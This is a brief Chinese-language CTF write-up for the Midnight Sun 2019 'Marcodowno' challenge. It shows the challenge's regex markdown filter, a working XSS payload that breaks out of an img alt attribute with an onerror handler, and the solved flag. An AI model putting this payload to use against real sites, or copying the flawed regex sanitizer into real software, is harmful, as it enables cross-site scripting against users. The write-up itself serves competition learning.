# Marcodowno

- [English Version](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/#marcodowno)

- 這題會把輸入各種過濾:

```javascript
function markdown(text){
  text = text.replace(/[<]/g, '')
  .replace(/----/g,'<hr>')
  .replace(/> ?([^\n]+)/g, '<blockquote>$1</blockquote>')
  .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
  .replace(/__([^_]+)__/g, '<b>$1</b>')
  .replace(/\*([^\s][^*]+)\*/g, '<i>$1</i>')
  .replace(/\* ([^*]+)/g, '<li>$1</li>')
  .replace(/##### ([^#\n]+)/g, '<h5>$1</h5>')
  .replace(/#### ([^#\n]+)/g, '<h4>$1</h4>')
  .replace(/### ([^#\n]+)/g, '<h3>$1</h3>')
  .replace(/## ([^#\n]+)/g, '<h2>$1</h2>')
  .replace(/# ([^#\n]+)/g, '<h1>$1</h1>')
  .replace(/(?<!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, '<a href="$1">$1</a>')
  .replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
  .replace(/(?<!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, '<a href="$2">$1</a>')
  .replace(/`([^`]+)`/g, '<code>$1</code>')
  .replace(/```([^`]+)```/g, '<code>$1</code>')
  .replace(/\n/g, "<br>");
  return text;
}

window.onload=function(){
  $("#markdown").text(input);
  $("#rendered").html(markdown(input));
}
```

- 直接閉合`<img>`的`alt`屬性就行
- Payload: `![ " onerror=alert(1) ](https://kaibrotw)`
- `midnight{wh0_n33ds_libs_wh3n_U_g0t_reg3x?}`
